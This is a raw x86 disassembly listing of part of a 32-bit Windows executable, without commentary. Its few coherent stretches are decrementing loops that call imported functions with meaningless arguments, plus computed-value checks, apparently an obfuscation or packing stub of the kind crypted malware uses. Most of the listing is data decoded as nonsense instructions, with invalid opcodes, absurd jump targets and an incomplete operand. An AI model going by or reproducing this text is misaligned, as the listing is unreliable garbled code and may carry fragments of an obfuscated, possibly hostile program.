  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433813,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433813,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433813,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433813,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433813
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433813,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433813
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433813,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x433853,0x16
  40eb34:	cmp    DWORD PTR ds:0x433853,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x433853,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x433853
  40eb64:	dec    eax
  40eb65:	mov    ds:0x433853,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x433863,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43381b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x4338ab,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    dl,ah
  40ebb4:	ja     0x40ebce
  40ebb6:	out    0x9a,al
  40ebb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ebd7
  40ebc0:	les    edx,FWORD PTR [ebp+0x3ca93c12]
  40ebc6:	or     DWORD PTR [edx],ebx
  40ebc8:	and    eax,DWORD PTR [ebx-0x5f2ec0c3]
  40ebce:	or     al,0x81
  40ebd0:	cwde   
  40ebd1:	popa   
  40ebd2:	mov    BYTE PTR [edx],cl
  40ebd4:	neg    DWORD PTR [ebp+0x7111a9eb]
  40ebda:	mov    esp,0xa736c12a
  40ebdf:	repnz cdq 
  40ebe1:	sahf   
  40ebe2:	sti    
  40ebe3:	sbb    esp,DWORD PTR [ebx-0x17fa2ee4]
  40ebe9:	es or  al,dl
  40ebec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebed:	pop    edx
  40ebee:	xor    al,0x6b
  40ebf0:	push   ss
  40ebf1:	div    edx
  40ebf3:	push   ds
  40ebf4:	pop    ds
  40ebf5:	inc    ecx
  40ebf6:	jo     0x40ec20
  40ebf8:	push   esi
  40ebf9:	dec    edx
  40ebfa:	mov    ebp,0xa952f431
  40ebff:	jae    0x40ebea
  40ec01:	loope  0x40ec03
  40ec03:	sub    BYTE PTR [ebx],bh
  40ec05:	sahf   
  40ec06:	mov    eax,DWORD PTR [bx+si-0x13]
  40ec0a:	and    bh,BYTE PTR [ecx]
  40ec0c:	stos   DWORD PTR es:[edi],eax
  40ec0d:	sub    eax,0x259ced1a
  40ec12:	loope  0x40ec81
  40ec14:	push   esi
  40ec15:	dec    esp
  40ec16:	push   esi
  40ec17:	jp     0x40ec39
  40ec19:	mov    BYTE PTR [eax+eax*1+0x3530b86c],al
  40ec20:	xor    esi,DWORD PTR [edi]
  40ec22:	clc    
  40ec23:	retf   0xbc99
  40ec26:	fst    DWORD PTR [edi+0x3f]
  40ec29:	push   ecx
  40ec2a:	das    
  40ec2b:	fcomip st,st(4)
  40ec2d:	dec    ebx
  40ec2e:	sub    DWORD PTR [esi+0x6e4a1387],edx
  40ec34:	push   cs
  40ec35:	ss ret 
  40ec37:	add    DWORD PTR [ecx-0x68],esp
  40ec3a:	out    0x11,eax
  40ec3c:	adc    DWORD PTR [esi],edi
  40ec3e:	enter  0x2251,0x33
  40ec42:	mov    edx,0x7ff6d552
  40ec47:	inc    ebp
  40ec48:	mov    al,es:0x5b8e58e8
  40ec4e:	loopne 0x40ec46
  40ec50:	push   ss
  40ec51:	retf   0xf48
  40ec54:	xor    ch,bl
  40ec56:	into   
  40ec57:	mov    DWORD PTR [edi+0x9649edc],eax
  40ec5d:	mov    esp,0x80dc3d36
  40ec62:	imul   edi,DWORD PTR [ecx],0xffffffba
  40ec65:	mov    ecx,0xbf6640d
  40ec6a:	mov    ch,0x5d
  40ec6c:	push   esi
  40ec6d:	mov    ch,0x1b
  40ec6f:	jnp    0x40ecb2
  40ec71:	mov    edx,0xb42af2e8
  40ec76:	sti    
  40ec77:	xchg   ebp,eax
  40ec78:	sub    dl,ch
  40ec7a:	in     eax,0x79
  40ec7c:	xor    eax,0x401b70f
  40ec81:	add    al,0x65
  40ec83:	out    dx,al
  40ec84:	mov    ds:0x76ed248d,eax
  40ec89:	push   edi
  40ec8a:	std    
  40ec8b:	jp     0x40ec99
  40ec8d:	inc    eax
  40ec8e:	sub    al,0x57
  40ec90:	not    BYTE PTR [ebx+0x31]
  40ec93:	or     edi,edi
  40ec95:	int    0xdf
  40ec97:	and    BYTE PTR [esi],ah
  40ec99:	push   ebp
  40ec9a:	push   esp
  40ec9b:	psllq  xmm3,XMMWORD PTR [eax]
  40ec9f:	lahf   
  40eca0:	adc    al,0x6a
  40eca2:	or     eax,0x136bf1af
  40eca7:	mov    bh,0x38
  40eca9:	pop    edx
  40ecaa:	dec    esp
  40ecab:	mov    edi,0x7b87c484
  40ecb0:	mov    ebx,0x3e48aaaf
  40ecb5:	into   
  40ecb6:	enter  0x542a,0x6d
  40ecba:	and    DWORD PTR [ecx],ebp
  40ecbc:	adc    ebx,DWORD PTR [ebx+0xc29ba6b]
  40ecc2:	add    al,0x9c
  40ecc4:	dec    ebp
  40ecc5:	push   cs
  40ecc6:	cmp    dl,BYTE PTR ss:[edi+0x16f43a0c]
  40eccd:	or     cl,bh
  40eccf:	pop    ss
  40ecd0:	sbb    eax,0xb6f311f0
  40ecd5:	xchg   edx,eax
  40ecd6:	xor    eax,0x10bebad7
  40ecdb:	ret    
  40ecdc:	sub    dl,BYTE PTR [ecx+0x7a249c02]
  40ece2:	pop    edx
  40ece3:	int    0xa3
  40ece5:	(bad)  
  40ece6:	jge    0x40ed5f
  40ece8:	mov    BYTE PTR [esi],dl
  40ecea:	test   DWORD PTR [di-0x2a],0xed630c28
  40ecf2:	das    
  40ecf3:	out    dx,al
  40ecf4:	cli    
  40ecf5:	outs   dx,DWORD PTR ds:[esi]
  40ecf6:	mov    edx,0x3fcd5a92
  40ecfb:	inc    esp
  40ecfc:	or     ebp,edx
  40ecfe:	push   ecx
  40ecff:	lods   al,BYTE PTR ds:[esi]
  40ed00:	call   0xd83938d4
  40ed05:	das    
  40ed06:	xor    esi,edx
  40ed08:	pop    es
  40ed09:	das    
  40ed0a:	cmp    ah,cl
  40ed0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed0d:	cmp    bl,bh
  40ed0f:	mov    ebp,DWORD PTR [ecx-0x48b40178]
  40ed15:	cmp    BYTE PTR [ebx],bl
  40ed17:	addr16 mov edi,0x9179b866
  40ed1d:	popa   
  40ed1e:	inc    ecx
  40ed1f:	ins    BYTE PTR es:[edi],dx
  40ed20:	jno    0x40ed51
  40ed22:	xor    DWORD PTR [eax-0x1cde33c3],esp
  40ed28:	mov    esp,fs
  40ed2a:	fnstcw WORD PTR [ebx+0xc058b0d]
  40ed30:	mul    DWORD PTR [ecx+0xd]
  40ed33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed34:	test   al,0x3d
  40ed36:	mov    bl,0xa3
  40ed38:	adc    dh,BYTE PTR [edx]
  40ed3a:	loop   0x40ed9b
  40ed3c:	aaa    
  40ed3d:	lea    edi,[ecx-0x37cb92a4]
  40ed43:	sub    cl,BYTE PTR [ebp-0x1a]
  40ed46:	mov    esp,0x7f007925
  40ed4b:	imul   esp,eax,0xfffffffe
  40ed4e:	cmp    al,0xcf
  40ed50:	hlt    
  40ed51:	sbb    ebp,DWORD PTR [edx-0x41159d9b]
  40ed57:	add    DWORD PTR [ebp+0x22],esi
  40ed5a:	cmp    edx,DWORD PTR [edx+0x34]
  40ed5d:	jo     0x40ed08
  40ed5f:	inc    ebx
  40ed60:	xor    al,dh
  40ed62:	mov    ds:0x757e9faa,eax
  40ed67:	std    
  40ed68:	ins    DWORD PTR es:[edi],dx
  40ed69:	adc    ebp,DWORD PTR [esi+0x48c306f7]
  40ed6f:	lods   eax,DWORD PTR ds:[esi]
  40ed70:	xchg   ebx,eax
  40ed71:	xchg   ebp,eax
  40ed72:	ret    0xd6b
  40ed75:	int    0x6c
  40ed77:	(bad)  
  40ed78:	(bad)  [eax]
  40ed7a:	cwde   
  40ed7b:	xor    DWORD PTR [ebx+0x6b],edx
  40ed7e:	(bad)  [esp+ebp*2+0x42]
  40ed82:	inc    ebx
  40ed83:	out    0x93,eax
  40ed85:	pop    ds
  40ed86:	xchg   esp,eax
  40ed87:	scas   eax,DWORD PTR es:[edi]
  40ed88:	push   ds
  40ed89:	mov    eax,ds:0x71f38347
  40ed8e:	sbb    al,0xf
  40ed90:	lds    edi,FWORD PTR [edi-0x63a0f224]
  40ed96:	jg     0x40ede5
  40ed98:	jno    0x40edcd
  40ed9a:	ret    0xd2b
  40ed9d:	shl    DWORD PTR [edi],cl
  40ed9f:	inc    ebx
  40eda0:	add    BYTE PTR [ebx],dh
  40eda2:	repnz mov DWORD PTR ds:0x433853,0x18
  40edad:	cmp    DWORD PTR ds:0x433853,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x433853,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x433853
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x433853,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x162834eb]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	test   dl,al
  40ee78:	dec    esp
  40ee79:	lahf   
  40ee7a:	fistp  QWORD PTR ds:0xfca92322
  40ee80:	jecxz  0x40ee7d
  40ee82:	xor    edx,ecx
  40ee84:	xchg   ebp,eax
  40ee85:	not    DWORD PTR [ebx-0x1a]
  40ee88:	icebp  
  40ee89:	clc    
  40ee8a:	ins    DWORD PTR es:[edi],dx
  40ee8b:	ins    DWORD PTR es:[edi],dx
  40ee8c:	inc    eax
  40ee8d:	ror    BYTE PTR [ebx+0x1f],0x5d
  40ee91:	rcr    DWORD PTR [edx+0x2cbbbb97],1
  40ee97:	jae    0x40ee86
  40ee99:	add    eax,0xb2e2a7e
  40ee9e:	sub    eax,0xbb895c5a
  40eea3:	outs   dx,BYTE PTR ds:[esi]
  40eea4:	les    eax,FWORD PTR [edx]
  40eea6:	retf   
  40eea7:	sbb    ah,BYTE PTR [ebx-0x2b]
  40eeaa:	xchg   DWORD PTR [eax+0x13487556],esi
  40eeb0:	jl     0x40eec7
  40eeb2:	jbe    0x40ee8f
  40eeb4:	repz cmp esi,ebx
  40eeb7:	xchg   esp,eax
  40eeb8:	push   ss
  40eeb9:	dec    ebp
  40eeba:	fisubr DWORD PTR [ecx]
  40eebc:	inc    esp
  40eebd:	jnp    0x40ee7f
  40eebf:	dec    ecx
  40eec0:	push   ebp
  40eec1:	jmp    0xaa7a:0x2fca8d11
  40eec8:	aam    0x17
  40eeca:	jb     0x40ee7f
  40eecc:	xor    DWORD PTR [eax+0x39162e8f],eax
  40eed2:	jbe    0x40ee95
  40eed4:	sub    al,BYTE PTR [eax-0x2f]
  40eed7:	nop
  40eed8:	imul   edx,DWORD PTR [eax+0x7f],0x72
  40eedc:	or     bl,al
  40eede:	test   BYTE PTR [ebp-0x7a],bl
  40eee1:	out    0x1c,al
  40eee3:	mov    ch,0x4b
  40eee5:	ret    
  40eee6:	sbb    al,BYTE PTR [ebx-0x59]
  40eee9:	clc    
  40eeea:	fbstp  TBYTE PTR [ebx+ebx*8+0x59]
  40eeee:	jle    0x40eee2
  40eef0:	cwde   
  40eef1:	jo     0x40ef5a
  40eef3:	in     eax,0xc0
  40eef5:	adc    bh,ch
  40eef7:	mov    eax,ds:0x66cc01d7
  40eefc:	adc    ah,BYTE PTR [ebp+0xd]
  40eeff:	ror    DWORD PTR [edi+0x58],0xb9
  40ef03:	test   eax,edx
  40ef05:	add    BYTE PTR [ecx+0x35],ch
  40ef08:	pop    ecx
  40ef09:	cs add al,0xf4
  40ef0c:	jae    0x40eea0
  40ef0e:	pushw  0xe336
  40ef12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef13:	repnz bound ebp,QWORD PTR [edx-0x453f69dc]
  40ef1a:	popa   
  40ef1b:	inc    edx
  40ef1c:	jecxz  0x40ef0a
  40ef1e:	pop    ecx
  40ef1f:	fld    st(2)
  40ef21:	mov    esi,esp
  40ef23:	cmp    BYTE PTR ds:0xd38039dc,bh
  40ef29:	daa    
  40ef2a:	jo     0x40ef07
  40ef2c:	mov    al,al
  40ef2e:	arpl   WORD PTR [ecx],si
  40ef30:	mov    al,BYTE PTR [ebx-0x63]
  40ef33:	shl    edx,cl
  40ef35:	icebp  
  40ef36:	mov    ch,0x3c
  40ef38:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef3a:	cwde   
  40ef3b:	push   ds
  40ef3c:	test   eax,0x983f93f9
  40ef41:	pop    ecx
  40ef42:	sbb    bl,BYTE PTR [esi+0x4b]
  40ef45:	(bad)  
  40ef46:	clc    
  40ef47:	adc    ebp,DWORD PTR [edi]
  40ef49:	jecxz  0x40efb6
  40ef4b:	jl     0x40ef35
  40ef4d:	mov    ecx,0x7a432d6
  40ef52:	inc    ecx
  40ef53:	js     0x40ef85
  40ef55:	add    al,0xf5
  40ef57:	fs int3 
  40ef59:	ror    DWORD PTR [ecx+0x6bec4929],cl
  40ef5f:	push   edi
  40ef60:	adc    BYTE PTR [ebx+0x5663ec8a],bh
  40ef66:	retf   
  40ef67:	inc    ebp
  40ef68:	xchg   edx,eax
  40ef69:	sbb    DWORD PTR [edx+0x3d1fb96b],edx
  40ef6f:	mov    al,ds:0x3f40d1f
  40ef74:	dec    ebp
  40ef75:	mov    ds:0xeb7fe9e4,eax
  40ef7a:	mov    ds:0x2da8f88c,al
  40ef7f:	lock aam 0xff
  40ef82:	imul   eax,DWORD PTR [ecx+0x44],0xfffffff1
  40ef86:	push   ebp
  40ef87:	sub    edi,ebp
  40ef89:	inc    edx
  40ef8a:	inc    ecx
  40ef8b:	pop    ecx
  40ef8c:	cs xchg edi,eax
  40ef8e:	loope  0x40ef59
  40ef90:	adc    al,0x98
  40ef92:	mov    dl,0x4a
  40ef94:	mov    ah,cl
  40ef96:	xor    DWORD PTR [eax],edx
  40ef98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef99:	fcmovnbe st,st(1)
  40ef9b:	pop    es
  40ef9c:	mov    ebx,0x3aa76cb9
  40efa1:	outs   dx,BYTE PTR ds:[esi]
  40efa2:	(bad)  
  40efa3:	jo     0x40f01d
  40efa5:	test   DWORD PTR [edi+0x55],ebp
  40efa8:	jne    0x40efd8
  40efaa:	in     eax,dx
  40efab:	out    dx,al
  40efac:	xor    al,0x3a
  40efae:	push   ss
  40efaf:	loope  0x40efa8
  40efb1:	xchg   ebx,eax
  40efb2:	in     al,0x79
  40efb4:	add    ebx,DWORD PTR [eax+0x5d]
  40efb7:	out    0x8d,al
  40efb9:	dec    eax
  40efba:	hlt    
  40efbb:	sbb    ah,BYTE PTR [edi+esi*8+0x6]
  40efbf:	lds    eax,FWORD PTR [eax-0x1c]
  40efc2:	jecxz  0x40efec
  40efc4:	push   edx
  40efc5:	mov    bh,0x5e
  40efc7:	test   ah,dh
  40efc9:	iret   
  40efca:	add    eax,0x766285e3
  40efcf:	rcl    DWORD PTR [ebx],1
  40efd1:	std    
  40efd2:	mov    esi,0x9c4285e2
  40efd7:	popf   
  40efd8:	hlt    
  40efd9:	mov    WORD PTR [ebx-0x5e],?
  40efdc:	ins    BYTE PTR es:[edi],dx
  40efdd:	(bad)  
  40efe0:	(bad)  
  40efe1:	fcom   QWORD PTR [ecx-0x43e70809]
  40efe7:	add    eax,0x9bb9ab4a
  40efec:	(bad)  
  40efed:	cmp    eax,0x39ce9e65
  40eff2:	pop    edx
  40eff3:	clc    
  40eff4:	loop   0x40efd0
  40eff6:	cmp    BYTE PTR [edx],0x76
  40eff9:	rcl    DWORD PTR [ecx+0x90a3080],1
  40efff:	sub    ah,BYTE PTR [ebx+0x2e]
  40f002:	daa    
  40f003:	xor    edx,DWORD PTR [edi-0x193af699]
  40f009:	add    esi,DWORD PTR [ebp-0x8759583]
  40f00f:	imul   ebp,DWORD PTR [edx+0x10b7457d],0xfc9c8645
  40f019:	sbb    eax,0x101073fb
  40f01e:	lods   eax,DWORD PTR ds:[esi]
  40f01f:	repz mov ebp,DWORD PTR [eax]
  40f022:	jecxz  0x40f003
  40f024:	cld    
  40f025:	mov    ebx,0x9b369b19
  40f02a:	fst    DWORD PTR [edi-0x41298854]
  40f030:	cmp    BYTE PTR [edx+0x35337b9f],dh
  40f036:	in     al,0x3a
  40f038:	cmp    BYTE PTR [ebx+0x6e],dh
  40f03b:	jg     0x40f004
  40f03d:	mov    esp,0x24645c53
  40f042:	das    
  40f043:	push   esi
  40f044:	sbb    edi,DWORD PTR [edx-0x4e877961]
  40f04a:	lods   al,BYTE PTR ds:[esi]
  40f04b:	push   eax
  40f04c:	mov    ecx,0x8b5980a2
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43381b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0xdb761594,ebx
  40f076:	jbe    0x40f09d
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	cmp    esi,ecx
  40f082:	push   edx
  40f083:	in     al,0xb
  40f085:	repnz popa 
  40f087:	adc    BYTE PTR [edi-0x71],cl
  40f08a:	mov    ecx,0xb7667cc2
  40f08f:	mov    eax,0xbaa7528f
  40f094:	cdq    
  40f095:	ja     0x40f0ed
  40f097:	add    DWORD PTR [eax+0x29],edi
  40f09a:	ins    BYTE PTR es:[edi],dx
  40f09b:	ror    DWORD PTR [eax+eax*8-0x68],0xa1
  40f0a0:	mov    ds:0xa52285fe,eax
  40f0a5:	pop    esi
  40f0a6:	pop    esp
  40f0a7:	sbb    DWORD PTR [ebp-0x80],edx
  40f0aa:	or     BYTE PTR [edx+0x56],ch
  40f0ad:	jmp    0x90bdbfc
  40f0b2:	jp     0x40f0e0
  40f0b4:	hlt    
  40f0b5:	call   edi
  40f0b7:	jae    0x40f04e
  40f0b9:	mov    DWORD PTR [edi+0x4eeef58e],edi
  40f0bf:	pop    ebx
  40f0c0:	jg     0x40f094
  40f0c2:	out    0x1,eax
  40f0c4:	push   edx
  40f0c5:	and    eax,0xe7ae2844
  40f0ca:	fsub   QWORD PTR [ecx-0x20c01851]
  40f0d0:	mov    ch,0x5c
  40f0d2:	arpl   WORD PTR [ebp-0x48078a08],ax
  40f0d8:	xchg   DWORD PTR [esi],eax
  40f0da:	add    ebx,DWORD PTR [ecx+0x6dd68aed]
  40f0e0:	call   0xc363fc08
  40f0e5:	stc    
  40f0e6:	ja     0x40f154
  40f0e8:	out    dx,al
  40f0e9:	fistp  QWORD PTR [edi-0x4e]
  40f0ec:	aaa    
  40f0ed:	ja     0x40f136
  40f0ef:	jp     0x40f075
  40f0f1:	xor    al,0xd
  40f0f3:	xchg   ecx,eax
  40f0f4:	fsubr  DWORD PTR [esi+0x36906082]
  40f0fb:	sub    cl,cl
  40f0fd:	jnp    0x40f0d2
  40f0ff:	scas   eax,DWORD PTR es:[edi]
  40f100:	push   ebp
  40f101:	stc    
  40f102:	dec    esi
  40f103:	xor    eax,0x2e92e029
  40f108:	nop
  40f109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f10a:	hlt    
  40f10b:	inc    edi
  40f10c:	gs pop edi
  40f10e:	push   0x61e694ed
  40f113:	out    dx,al
  40f114:	sub    DWORD PTR [edi+0x61d2f3ce],edx
  40f11a:	aam    0x54
  40f11c:	push   ds
  40f11d:	mov    es,WORD PTR [esi]
  40f11f:	popf   
  40f120:	sub    DWORD PTR [ecx+esi*4-0x69b73143],ebp
  40f127:	js     0x40f124
  40f129:	call   0x335e:0x56633105
  40f130:	jecxz  0x40f0cf
  40f132:	data16 cli 
  40f134:	sub    BYTE PTR [eax+ecx*8+0x0],ch
  40f138:	nop
  40f139:	jge    0x40f0ec
  40f13b:	jg     0x40f1a5
  40f13d:	inc    ebp
  40f13e:	lods   eax,DWORD PTR ds:[esi]
  40f13f:	fsubrp st(2),st
  40f141:	add    eax,DWORD PTR [ecx+0x6f]
  40f144:	adc    al,BYTE PTR [esp+ebx*2-0x5670d8d7]
  40f14b:	push   0xffffffb7
  40f14d:	call   0x1bb6:0xe607d04e
  40f154:	adc    bl,bh
  40f156:	xchg   edi,eax
  40f157:	jl     0x56876c49
  40f15d:	dec    eax
  40f15e:	pusha  
  40f15f:	jnp    0x40f1a8
  40f161:	in     al,dx
  40f162:	xchg   BYTE PTR [ecx+0x32ba6c54],al
  40f168:	sub    ah,ah
  40f16a:	xor    DWORD PTR [edi+0x3e694367],esp
  40f170:	jo     0x40f1d3
  40f172:	fild   WORD PTR [ecx-0x10]
  40f175:	das    
  40f176:	or     eax,0x311b6d20
  40f17b:	fwait
  40f17c:	out    0x4e,eax
  40f17e:	shl    DWORD PTR [esi-0xb197cee],cl
  40f184:	seta   ch
  40f187:	lea    ebx,ds:0x9954ea66
  40f18d:	popf   
  40f18e:	add    DWORD PTR [ebx-0x54],edi
  40f191:	data16 cmp BYTE PTR [ebp-0x9],dl
  40f195:	adc    ah,ah
  40f197:	inc    ecx
  40f198:	nop
  40f199:	dec    edx
  40f19a:	inc    edx
  40f19b:	ss mov esp,0x662c56a5
  40f1a1:	in     al,0xca
  40f1a3:	add    DWORD PTR [ecx-0x401995d4],ecx
  40f1a9:	(bad)  
  40f1aa:	and    cl,BYTE PTR [ecx-0x7b94cde]
  40f1b0:	add    ch,BYTE PTR [ecx+0xd]
  40f1b3:	out    0xc0,eax
  40f1b5:	add    al,0xe2
  40f1b7:	and    dl,bl
  40f1b9:	stc    
  40f1ba:	mov    al,ds:0x61be0243
  40f1bf:	data16 fisubr DWORD PTR [eax+0x74]
  40f1c3:	push   ecx
  40f1c4:	dec    esp
  40f1c5:	xchg   edi,eax
  40f1c6:	adc    BYTE PTR [esi],al
  40f1c8:	push   cs
  40f1c9:	jnp    0x40f239
  40f1cb:	nop
  40f1cc:	imul   esp,ebx,0xffffff81
  40f1cf:	push   eax
  40f1d0:	jb     0x40f1f8
  40f1d2:	jecxz  0x40f1bf
  40f1d4:	xor    eax,0xf2f29619
  40f1d9:	stc    
  40f1da:	int    0x68
  40f1dc:	xchg   ecx,eax
  40f1dd:	inc    BYTE PTR [edi]
  40f1df:	adc    BYTE PTR [ebx-0x15],cl
  40f1e2:	div    DWORD PTR [edi]
  40f1e4:	or     al,0xed
  40f1e6:	mov    DWORD PTR [eax],eax
  40f1e8:	jnp    0x40f22b
  40f1ea:	jae    0x40f259
  40f1ec:	add    esi,DWORD PTR [eax-0xa43ec5f]
  40f1f2:	shr    DWORD PTR [ebx],1
  40f1f4:	xchg   esp,eax
  40f1f5:	fisttp QWORD PTR [edi-0x5e1c047d]
  40f1fb:	inc    esi
  40f1fc:	cdq    
  40f1fd:	add    cl,BYTE PTR [ecx+esi*2+0x49e0a9f2]
  40f204:	imul   esi,esi,0xeb09e02c
  40f20a:	mov    ah,0x4f
  40f20c:	aas    
  40f20d:	dec    ecx
  40f20e:	mov    ch,0x2
  40f210:	adc    eax,eax
  40f212:	jne    0x40f1b8
  40f214:	adc    DWORD PTR [edi+0xf],eax
  40f217:	mov    eax,0x241098c7
  40f21c:	xchg   ebx,eax
  40f21d:	test   al,0x67
  40f220:	popf   
  40f221:	jge    0x40f238
  40f223:	push   0xb
  40f225:	imul   ecx,DWORD PTR [ecx-0x36],0x80b7d6ce
  40f22c:	push   edx
  40f22d:	dec    si
  40f22f:	pop    eax
  40f230:	test   edi,ebx
  40f232:	je     0x40f263
  40f234:	pop    ecx
  40f235:	adc    ecx,DWORD PTR [edx]
  40f237:	nop
  40f238:	pop    ds
  40f239:	push   0x48
  40f23b:	sbb    edx,ebx
  40f23d:	lahf   
  40f23e:	mov    dh,0x42
  40f240:	or     ecx,DWORD PTR cs:[edi-0x40]
  40f244:	dec    eax
  40f245:	retf   0x7a72
  40f248:	stc    
  40f249:	shr    dh,0x5b
  40f24c:	push   ds
  40f24d:	dec    bh
  40f24f:	outs   dx,BYTE PTR ds:[esi]
  40f250:	popa   
  40f251:	mov    ah,0x89
  40f253:	dec    edx
  40f254:	hlt    
  40f255:	mov    esi,0x15ef6ec2
  40f25a:	cwde   
  40f25b:	sub    al,0x31
  40f25d:	mov    ebp,0x798c9ca0
  40f262:	mov    ecx,0xfb3fdf15
  40f267:	jg     0x40f270
  40f269:	adc    bh,BYTE PTR [eax-0x52]
  40f26c:	jecxz  0x40f22b
  40f26e:	dec    edx
  40f26f:	out    0x47,eax
  40f271:	mov    DWORD PTR [edx],ecx
  40f273:	xor    edi,ecx
  40f275:	ja     0x40f222
  40f277:	fcomp  DWORD PTR [ecx+0x66]
  40f27a:	aad    0xb9
  40f27c:	nop
  40f27d:	push   ss
  40f27e:	fild   DWORD PTR [esi-0x34]
  40f281:	add    esp,DWORD PTR [ecx+0x61]
  40f284:	sti    
  40f285:	push   eax
  40f286:	leave  
  40f287:	mov    ah,0xd8
  40f289:	and    BYTE PTR [eax],cl
  40f28b:	aaa    
  40f28c:	mov    dl,0x9
  40f28e:	dec    ecx
  40f28f:	xchg   esp,eax
  40f290:	inc    ecx
  40f291:	std    
  40f292:	push   cs
  40f293:	int3   
  40f294:	leave  
  40f295:	pushf  
  40f296:	inc    esi
  40f297:	adc    eax,0x3bd80b2c
  40f29c:	es jl  0x40f2e5
  40f29f:	int    0x20
  40f2a1:	ins    DWORD PTR es:[edi],dx
  40f2a2:	jb     0x40f244
  40f2a4:	pop    ebp
  40f2a5:	bound  ebp,QWORD PTR [edx]
  40f2a7:	shl    DWORD PTR [ecx],1
  40f2a9:	(bad)  [edi+0x38487f30]
  40f2af:	xor    edx,esp
  40f2b1:	xchg   ecx,eax
  40f2b2:	in     eax,dx
